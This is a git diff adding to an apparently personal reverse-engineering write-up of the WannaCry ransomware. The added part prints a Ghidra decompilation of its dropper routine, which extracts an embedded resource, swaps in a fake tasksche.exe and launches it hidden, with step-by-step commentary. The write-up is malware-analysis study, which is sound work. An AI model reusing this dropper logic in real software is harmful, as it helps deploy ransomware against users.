@@ -186,6 +186,8 @@ We see an example of where ghidra struggles in some of its decompilation efforts
 ```
 See? Much more legible.
 
+---
+
 Now, seeing the functions InternetOpenA and InternetOpenUrlA we can assume this is the portion of the code where the worm checks if the url is accessible and then terminates if it is (My favorite theory is that this was a VM check because since that was an unregistered domain it shouldnt resolve but VMs
 do some type of VM magic in order to resolve every URL and thats how the worm checks if its in a VM).
 
@@ -277,13 +279,200 @@ undefined4 create_service_and_run(void)
 
 
 ```
-I went ahead and added some comments, but essentially, this function stores the path of wannacry with the -security flag in a buffer which is then used in the [CreateServiceA API](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea) to make a fake Microsoft security service.
+I went ahead and added some comments, but essentially, this function stores the path of wannacry with the -m security flag in a buffer which is then used in the [CreateServiceA API](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea) to make a fake Microsoft security service.
 
 We then see a simple check that checks to see if the service didn't fail to get created, then to start it and close all handles afterwards.
 
 Lets now jump into the other function call in the not enough args handler function!
 
 #### second function call in not enough args handler
+This function is lengthy, but I will go through it step by step. (note: I have already renamed most variables as this will make comprehension easier in my opinion)
+
+```c++
+                    /* get handle to kernel dll */
+  hModule = GetModuleHandleW(u_kernel32.dll_004313b4);
+  if (hModule != (HMODULE)0x0) {
+    create_process_address = (CreateProcessA *)GetProcAddress(hModule,s_CreateProcessA_004313a4);
+    Create_File_Address = (CreateFileA *)GetProcAddress(hModule,s_CreateFileA_00431398);
+    WriteFile_Address = (WriteFile *)GetProcAddress(hModule,s_WriteFile_0043138c);
+    CloseHandle_Address = (CloseHandle *)GetProcAddress(hModule,s_CloseHandle_00431380);
+                    /* load functions from kernel dll */
+    if ((((create_process_address != (CreateProcessA *)0x0) &&
+         (Create_File_Address != (CreateFileA *)0x0)) && (WriteFile_Address != (WriteFile *)0x0)) &&
+       (CloseHandle_Address != (CloseHandle *)0x0)) {
+                    /* if addresses of functions are valid, then find a resource */
+      hResInfoFor1831 = FindResourceA((HMODULE)0x0,(LPCSTR)0x727,&DAT_0043137c);
+                    /* Find resource with name integer id 1831 */
+      if (hResInfoFor1831 != (HRSRC)0x0) {
+                    /* if it exists, then load the data for that resource */
+        hResData = LoadResource((HMODULE)0x0,hResInfoFor1831);
+        if (hResData != (HGLOBAL)0x0) {
+                    /* if the data exists, then lock the data */
+          pvStack_260 = LockResource(hResData);
+          if (pvStack_260 != (LPVOID)0x0) {
+                    /* if lock exists, then get teh size of the respurce */
+            SizeOf1831Res = SizeofResource((HMODULE)0x0,hResInfoFor1831);
+            if (SizeOf1831Res != 0) {
+              tasksche_path_buffer = '\0';
+              pointer = &local_207;
+                    /* memset local_208 and 64 bytes after to 0 */
+              for (i = 64; i != 0; i = i + -1) {
+                *pointer = 0;
+                pointer = pointer + 1;
+              }
+              *(undefined2 *)pointer = 0;
+              *(undefined1 *)((int)pointer + 2) = 0;
+              qeriuwjhrf_path_buffer = '\0';
+              pointer = &local_103;
+              for (i = 64; i != 0; i = i + -1) {
+                *pointer = 0;
+                pointer = pointer + 1;
+              }
+              *(undefined2 *)pointer = 0;
+              *(undefined1 *)((int)pointer + 2) = 0;
+                    /* moves C:\WINDOWS\taskche.exe into buffer previously zeroed out by memset */
+              sprintf(&tasksche_path_buffer,s_C:\%s\%s_00431358,s_WINDOWS_00431364,
+                      s_tasksche.exe_0043136c);
+                    /* moves C:\WINDOWS\qeriuwhjrf into buffer previously zeroed out by memset */
+              sprintf(&qeriuwjhrf_path_buffer,s_C:\%s\qeriuwjhrf_00431344,s_WINDOWS_00431364,
+                      unaff_EDI);
+                    /* qeriuwjhrf_path_buffer's contents gets replaced with taskche.exe path
+                       buffer's contents */
+              MoveFileExA(&tasksche_path_buffer,&qeriuwjhrf_path_buffer,1);
+                    /* this function returns a handle to a created file with write accesss and
+                       prevenmts other files from requesting read write or delete access
+                       
+                       This is moving the file of tasksche.exe to another location under another
+                       name so we can create our own tasksche.exe (malware) */
+              createdFileHandle =
+                   (*Create_File_Address)
+                             (&tasksche_path_buffer,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,4,
+                              (HANDLE)0x0);
+              if (createdFileHandle != (HANDLE)0xffffffff) {
+                    /* if file handle is successfully created, then the locked data of the 1831
+                       resource is written into the file and then the handle is closed */
+                (*WriteFile_Address)
+                          (createdFileHandle,pvStack_260,SizeOf1831Res,(LPDWORD)&pvStack_260,
+                           (LPOVERLAPPED)0x0);
+                (*CloseHandle_Address)(createdFileHandle);
+                    /* the below three lines are zeroing out fields in the process information
+                       struct */
+                process_info_struct.hThread = (HANDLE)0x0;
+                process_info_struct.dwProcessId = 0;
+                process_info_struct.dwThreadId = 0;
+                ptr_to_strup_struct = &startup_info_struct.lpReserved;
+                    /* for loop below is getting a pointer to the address of the startup info struct
+                       lpreserved part and tehn walking through the struct and zeroing it out */
+                for (i = 16; i != 0; i = i + -1) {
+                  *ptr_to_strup_struct = (LPSTR)0x0;
+                  ptr_to_strup_struct = ptr_to_strup_struct + 1;
+                }
+                    /* if you look in teh disassembly output, this ptr has the value of 20 2f 69 00
+                       which trnaslated from hex is ' /i'null terminator'' */
+                j = 0xffffffff;
+                PtrB = (char *)&slashIstring;
+                do {
+                  PtrA = PtrB;
+                  if (j == 0) break;
+                  j = j - 1;
+                  PtrA = PtrB + 1;
+                  StringCharReader = *PtrB;
+                  PtrB = PtrA;
+                } while (StringCharReader != '\0');
+                j = ~j;
+                    /* The above do-while loop is essentially strlen. It gets the ptr to the string
+                       it wants to read, decremements the counter by one, advances one byte in PtrA,
+                       points the ptr used for char reading to the current byte, sets PtrB to Ptr A,
+                       and then checks the byte. This way ~j (NOT j) is equal to the len of the
+                       string + the null terminator  */
+                process_info_struct.hProcess = (HANDLE)0x0;
+                i = -1;
+                PtrB = &tasksche_path_buffer;
+                do {
+                  Current_taskche_ptr = PtrB;
+                  if (i == 0) break;
+                  i = i + -1;
+                  Current_taskche_ptr = PtrB + 1;
+                  StringCharReader = *PtrB;
+                  PtrB = Current_taskche_ptr;
+                } while (StringCharReader != '\0');
+                    /*  ptrB gets set back to the beginning of its string & PtrA now points to the
+                       null terminator byte */
+                PtrB = PtrA + -j;
+                PtrA = Current_taskche_ptr + -1;
+                    /* this loop is saying divide j by 4, copy the bytes over from Ptr B to Ptr A
+                       and then keep going until k = 0. This might leave left over bits though which
+                       is what the next for loop handles */
+                for (k = j >> 2; k != 0; k = k - 1) {
+                  *(undefined4 *)PtrA = *(undefined4 *)PtrB;
+                  PtrB = PtrB + 4;
+                  PtrA = PtrA + 4;
+                }
+                    /* handles left over bytes from previous for loop bit by bit yb calculating the
+                       remainder left from j when divided by 4 i.e. j % 4
+                       
+                       by the end we get the string C:\WINDOWS\taskche.exe /i
+                        */
+                for (j = j & 3; j != 0; j = j - 1) {
+                  *PtrA = *PtrB;
+                  PtrB = PtrB + 1;
+                  PtrA = PtrA + 1;
+                }
+                    /* stes the size of the struct */
+                startup_info_struct.cb = 0x44;
+                    /* 0 means SW_Hide flag is set  */
+                startup_info_struct.wShowWindow = 0;
+                    /* tehse flags make it so that the hourglass cursor doesnt appear and that this
+                       process is able to use the showwindow ability (0x81 = 0x80 + 0x01 =
+                       STARTF_FORCEOFFFEEDBACK | STARTF_USESHOWWINDOW) */
+                startup_info_struct.dwFlags = 0x81;
+                    /* this creates a process that uses C:\WINDOWS\taskche.exe /i in the cmd line
+                       and has a creation flag set so the process doesnt create a window */
+                taskche_process =
+                     (*create_process_address)
+                               ((LPCSTR)0x0,&tasksche_path_buffer,(LPSECURITY_ATTRIBUTES)0x0,
+                                (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,
+                                &startup_info_struct,&process_info_struct);
+                if (taskche_process != 0) {
+                  (*CloseHandle_Address)(process_info_struct.hThread);
+                  (*CloseHandle_Address)(process_info_struct.hProcess);
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+  return 0;
+}
+```
+
+The first portion of this code we will analyze is the handle to the kernel32 dll. Two things to note. A handle is a way for the oeprating system to allow an application to interact with system resources, and the kernel 32 dll is a dll with a lot of the Microsoft Windows API functions. 
+
+This portion is getting a handle to the lkernel32 dll and laoding the address of 4 apis: [CreateProcessA]([https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)), [CreateFileA](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea), [WriteFile](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile), and CloseHandle which is pretty self-explanatory.
+
+The following code then hecks if the addresses are valid and then finds a resource with integer id 1831, checks if it succeeded and then laods its data, checks if the load succeeded and then locks the data, and then checks if the lock succeeded and finds the size of the 1831 Resource.
+
+---
+
+Then the follwoing code zeroes out two buffers and moves two paths into their own buffer: ```C:\WINDOWS\tasksche.exe``` and ```C:\WINDOWS\qeriuwhjrf```.
+
+Then [MoveFileExA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-movefileexa) is called on teh two buffers with a flag of 1 which moves the files for tasksche.exe to the file path qeri...
+
+This allows for teh malware to have unobstructed write access to the file path tasksche.exe since its contents are at another lcoation so no errors will be thrown.
+
+---
+
+Then a handle to a new file is created with permission making it so that no other process can request for it to be deleted, read, or written to.
+
+Then a new file is written to the new file handle and the handle is closed.
+
+Pretty sneaky...
+
+The rest of the code then zeroes out some of the process and start up info structs to prepare them to be written to, concatenates the string ```C:\WINDOWS\taskche.exe /i```, and creates a process with no window on startup and during execution, no hourglass icon, and the concatenated string as the cmdline argument.
+
+
 
 
 To Be COntinued....
